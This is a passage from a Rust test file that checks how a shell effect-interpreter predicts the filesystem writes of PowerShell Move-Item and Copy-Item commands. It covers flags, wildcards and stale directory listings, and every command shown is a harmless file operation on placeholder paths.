    let moved = |source: &str, entry: effinterp_proto::PathKind, kind| {
        let observations = ObservedPaths::listed(
            [
                (
                    "/d",
                    observed_entry("/d", effinterp_proto::PathKind::Directory),
                ),
                ("/d/a", observed_entry("/d/a", entry)),
                ("/w/a", observed_entry("/w/a", kind)),
            ],
            [("/w/a", vec![])],
        );
        let plan = observed_shell(source, &observations);
        let writes = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.as_str() == "filesystem.write")
            .map(|effect| path_of(&effect.resource))
            .collect::<Vec<_>>();
        (writes, plan.boundaries.len())
    };
    use effinterp_proto::PathKind::{Directory, File, Missing};
    assert_eq!(
        moved("pwsh -Command 'Move-Item /w/a /d'", Missing, Directory),
        (vec!["/d".to_string(), "/d/a".to_string()], 0)
    );
    assert_eq!(
        moved(
            "pwsh -Command 'Move-Item -Force /w/a /d'",
            Directory,
            Directory
        ),
        (vec!["/d".to_string()], 1)
    );
    assert_eq!(
        moved("pwsh -Command 'Move-Item /w/a /d'", File, File),
        (vec!["/d".to_string()], 1)
    );
    assert_eq!(
        moved("pwsh -Command 'Move-Item -Force /w/a /d'", File, File),
        (vec!["/d".to_string(), "/d/a".to_string()], 0)
    );
    // -Force replaces a file, never a directory.
    assert_eq!(
        moved("pwsh -Command 'Move-Item -Force /w/a /d'", Directory, File),
        (vec!["/d".to_string()], 1)
    );
    // A wildcard's entries land inside an existing directory under their own
    // names, each a write of its own, as the host lists the directory the
    // wildcard selects beneath. The destination write then states that only
    // entries are written; where the listing does not establish what lands,
    // the destination stays written and an observation boundary says why.
    let listed = ObservedPaths::listed(
        [
            (
                "/d",
                observed_entry("/d", effinterp_proto::PathKind::Directory),
            ),
            ("/w/s", observed_entry("/w/s", Directory)),
            ("/w/e", observed_entry("/w/e", Directory)),
            ("/w/u", observed_entry("/w/u", Directory)),
            ("/w/[s]", observed_entry("/w/[s]", Directory)),
        ],
        [
            (
                "/w/s",
                vec![(".h", File), ("a", File), ("b", Directory), ("b/c", File)],
            ),
            ("/w/e", vec![]),
            ("/w/[s]", vec![("x", File)]),
        ],
    );
    let landing = |source: &str| {
        let plan = observed_shell(source, &listed);
        let writes = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.as_str() == "filesystem.write")
            .map(|effect| {
                let entries_only = effect.attributes.get("entries_only")
                    == Some(&effinterp_proto::AttrValue::Bool(true));
                format!(
                    "{}{}",
                    path_of(&effect.resource),
                    if entries_only { " (entries)" } else { "" }
                )
            })
            .collect::<Vec<_>>();
        // Each boundary saying what lands is not established: an
        // unavailable listing, or a model gap.
        let reasons = plan
            .boundaries
            .iter()
            .map(|boundary| boundary.reason.as_str().to_string())
            .filter(|reason| {
                ["observation_unavailable", "model_coverage"].contains(&reason.as_str())
            })
            .collect::<Vec<_>>();
        (writes, reasons)
    };
    let none = Vec::<String>::new;
    let unobserved = || vec!["observation_unavailable".to_string()];
    let unmodeled = || vec!["model_coverage".to_string()];
    // A hidden entry is selected only under -Force, and everything beneath
    // an entry lands only under -Recurse.
    assert_eq!(
        landing("pwsh -Command 'Copy-Item /w/s/* /d'"),
        (
            vec!["/d (entries)".into(), "/d/a".into(), "/d/b".into()],
            none()
        )
    );
    assert_eq!(
        landing("pwsh -Command 'Copy-Item -Recurse -Force /w/s/* /d -Exclude a'"),
        (
            vec![
                "/d (entries)".into(),
                "/d/.h".into(),
                "/d/b".into(),
                "/d/b/c".into()
            ],
            none()
        )
    );
    // A moved file replaces what is there only under -Force; a moved
    // directory fails or merges, which is not established.
    assert_eq!(
        landing("pwsh -Command 'Move-Item -Force /w/s/* /d'"),
        (
            vec!["/d".into(), "/d/.h".into(), "/d/a".into()],
            unmodeled()
        )
    );
    // An empty selection lands nothing, and an unlisted directory's
    // selection is not established.
    assert_eq!(
        landing("pwsh -Command 'Copy-Item /w/e/* /d'"),
        (vec!["/d (entries)".into()], none())
    );
    assert_eq!(
        landing("pwsh -Command 'Copy-Item /w/u/* /d'"),
        (vec!["/d".into()], unobserved())
    );
    // LiteralPath names one path, brackets and all, and a recursive copy
    // lands what it holds beneath the entry it lands as.
    assert_eq!(
        landing("pwsh -Command 'Copy-Item -Recurse -LiteralPath /w/[s] /d'"),
        (
            vec!["/d".into(), "/d/[s]".into(), "/d/[s]/x".into()],
            none()
        )
    );
    // A bracket set has no negation: `[!b]` is `!` or `b`.
    assert_eq!(
        landing("pwsh -Command 'Copy-Item /w/s/[!b]* /d'"),
        (vec!["/d (entries)".into(), "/d/b".into()], none())
    );
    // Off Windows, whether case is folded is not established: an entry
    // selected under one case rule only is written, and a model gap says so.
    assert_eq!(
        landing("pwsh -Command 'Copy-Item /w/s/[A] /d'"),
        (vec!["/d (entries)".into(), "/d/a".into()], unmodeled())
    );
    // A write into the listed directory earlier in the plan makes its
    // listing stale: the destination stays written and nothing is trusted.
    let (writes, reasons) =
        landing("pwsh -Command 'Set-Content /w/e/x y; Move-Item -Force /w/e/* /d'");
    assert!(writes.contains(&"/d".to_string()), "{writes:?}");
    assert!(reasons.contains(&unobserved()[0]), "{reasons:?}");
    // So does a recursive write to the directory itself or an ancestor.
    for filled in ["cp -r /w/s/. /w/e", "cp -r /w/s/. /w"] {
        let (writes, reasons) =
            landing(&format!("{filled} && pwsh -Command 'Copy-Item /w/e/* /d'"));
        assert!(writes.contains(&"/d".to_string()), "{filled}: {writes:?}");
        assert!(reasons.contains(&unobserved()[0]), "{filled}: {reasons:?}");
    }
    // A step the engine cannot model may create files in the directory, so
    // it leaves every later listing stale too.
    for unmodeled in [
        "New-Item /w/e/x",
        "'x' | Tee-Object /w/e/x",
        "[IO.File]::WriteAllText('/w/e/x', 'x')",
        "Write-Host (New-Item /w/e/x)",
    ] {
        let (writes, reasons) = landing(&format!(
            "pwsh -Command \"{unmodeled}; Move-Item -Force /w/e/* /d\""
        ));
        assert!(
            writes.contains(&"/d".to_string()),
            "{unmodeled}: {writes:?}"
        );
        assert!(
            reasons.contains(&unobserved()[0]),
            "{unmodeled}: {reasons:?}"
        );
    }
    // So does an unknown program, which the shell cannot model at all.
    let (writes, reasons) =
        landing("unknown-tool --out /w/e && pwsh -Command 'Move-Item -Force /w/e/* /d'");
    assert!(writes.contains(&"/d".to_string()), "{writes:?}");
    assert!(reasons.contains(&unobserved()[0]), "{reasons:?}");
    // Statements that write nothing leave the listing trusted.
    assert_eq!(
        landing(
            "pwsh -Command 'Set-Location /w; Write-Host hi; $ErrorActionPreference = \"Stop\"; Copy-Item /w/s/* /d'"
        ),
        (
            vec!["/d (entries)".into(), "/d/a".into(), "/d/b".into()],
            none()
        )
    );
    // A write spelled through another name for the listed directory, here a
    // link, is compared by the identity the host establishes for it. One
    // whose identity is not established leaves the listing stale too.
    let aliased = |written: &'static str, entry: &'static str| {
        let mut fact = observed_entry(entry, Missing);
        if let effinterp_proto::ObservationOutcome::Path(fact) = &mut fact {
            fact.followed =
                effinterp_proto::Fact::Unavailable(effinterp_proto::ObservationRefusal::Unobserved);
        }
        let observations = ObservedPaths::listed(
            [
                ("/d", observed_entry("/d", Directory)),
                ("/w/e", observed_entry("/w/e", Directory)),
                (written, fact),
            ],
            [("/w/e", vec![])],
        );
        let source = format!("pwsh -Command 'Set-Content {written} y; Move-Item -Force /w/e/* /d'");
        observed_shell(&source, &observations)
            .effects
            .iter()
            .filter(|effect| effect.operation.as_str() == "filesystem.write")
            .map(|effect| {
                let entries_only = effect.attributes.get("entries_only")
                    == Some(&effinterp_proto::AttrValue::Bool(true));
                format!(
                    "{}{}",
                    path_of(&effect.resource),
                    if entries_only { " (entries)" } else { "" }
                )
            })
            .collect::<Vec<_>>()
    };
    assert_eq!(aliased("/w/alias/x", "/w/e/x"), ["/w/alias/x", "/d"]);
    assert_eq!(aliased("/w/o/x", "/w/o/x"), ["/w/o/x", "/d (entries)"]);
    let unobserved_write = landing("pwsh -Command 'Set-Content /w/u/x y; Copy-Item /w/e/* /d'");
    assert!(
        unobserved_write.0.contains(&"/d".to_string()),
        "{unobserved_write:?}"
    );
    // A pattern that spells the dot may still select dot names without
    // -Force: the entry is written and a model gap says so.
    assert_eq!(
        landing("pwsh -Command 'Copy-Item /w/s/.* /d'"),
        (vec!["/d (entries)".into(), "/d/.h".into()], unmodeled())
    );
}
